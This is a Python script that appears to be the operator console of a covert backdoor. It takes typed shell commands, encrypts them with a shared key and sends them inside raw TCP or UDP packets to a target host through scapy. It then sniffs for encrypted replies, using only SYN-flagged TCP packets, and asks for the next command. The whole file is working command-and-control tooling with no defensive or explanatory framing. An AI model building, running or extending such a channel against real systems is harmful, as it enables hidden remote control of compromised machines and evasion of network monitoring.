#! /usr/bin/env python

from scapy.all import *
from random import randint
from cyphermod import *
import sys

def pkt_callback(pkt):
  layers = []
  counter = 0
  while True:
    layer = pkt.getlayer(counter)
    if (layer != None):
      layers.append(layer.name)
    else:
      break
    counter += 1
  valid=0 
  if any("IP" in s for s in layers):
    valid=1
  if valid==0:
    return
  if str(pkt[IP].proto) == "6":
    payload = str(pkt[TCP].payload)
    F = pkt['TCP'].flags
    if not F & 0x02:
      return
  elif str(pkt[IP].proto) == "17":
    payload = str(pkt[Raw].load)
  else:
    return
  decoded=decode(key,payload)
  print decoded
  if(decoded=="END............."):
    command = raw_input('Enter a command: ')
    if len(command) > 0:
      command = command + (" "* (16-(len(command)%16)))
      encoded=encode(key,command)
      pkt=send(IP(dst=dsthost)/PROTO/encoded, verbose=0)
    else:
      sys.exit()

def validate_ip(ip):
  num = ip.split('.')
  if len(num) != 4:
    return False
  for x in num:
    if not x.isdigit():
      return False
    i = int(x)
    if i < 0 or i > 255:
      return False
  return True

def validate_port(port):
  if not port.isdigit():
    return False
  i = int(port)
  if i < 0 or i > 65535:
    return False
  return True

def validate_key(key):
  if len(key) > 32 or len(key) < 8:
    return False
  return True  

if len(sys.argv) < 6:
  print("\n	Usage: python command.py dest_ip protocol dest_port key\n")
  sys.exit()
if validate_ip(sys.argv[1]) == False:
  print("\n	Please Input valid ip.")
  print("	Usage: python command.py dest_ip protocol dest_port key\n")
  sys.exit()
if not ((str(sys.argv[2]) == "UDP") or (str(sys.argv[2]) == "TCP")):
  print("\n	Please Input valid protocol.")
  print("	Usage: python command.py dest_ip protocol dest_port key\n")
  sys.exit()
if validate_port(sys.argv[3]) == False:
  print("\n	Please Input valid port.")
  print("	Usage: python command.py dest_ip protocol dest_port key\n")
  sys.exit()
if validate_port(sys.argv[4]) == False:
  print("\n	Please Input valid port.")
  print("	Usage: python command.py dest_ip protocol dest_port key\n")
  sys.exit()
if validate_key(sys.argv[5]) == False:
  print("\n	Please Input valid key: minimum 8 characters, maximum 32 characters")
  print("	Usage: python command.py dest_ip dest_port key\n")
  sys.exit()
dsthost=sys.argv[1]
dstport=int(sys.argv[3])
recport=int(sys.argv[4])
if len(sys.argv[5]) < 16:
  key=sys.argv[5] + (" "*(16-len(sys.argv[5])))
elif len(sys.argv[5]) < 24:
  key=sys.argv[5] + (" "*(24-len(sys.argv[5])))
elif len(sys.argv[5]) < 32:
  key=sys.argv[5] + (" "*(32-len(sys.argv[5])))
srcport=random.randint(1024,65535)
if(str(sys.argv[2]) == "TCP"):
  PROTO=TCP(sport=srcport,dport=dstport)
  sniff_filter= "tcp and dst port " + str(recport)
else:
  PROTO=UDP(sport=srcport,dport=dstport)
  sniff_filter= "udp and dst port " + str(recport)
command = raw_input('Enter a command: ')
if len(command) > 0:
  command = command + (" "* (16-(len(command)%16)))
  encoded=encode(key,command)
  pkt=send(IP(dst=dsthost)/PROTO/encoded, verbose=0)
sniff(iface="eno1", prn=pkt_callback, filter=sniff_filter, store=0)
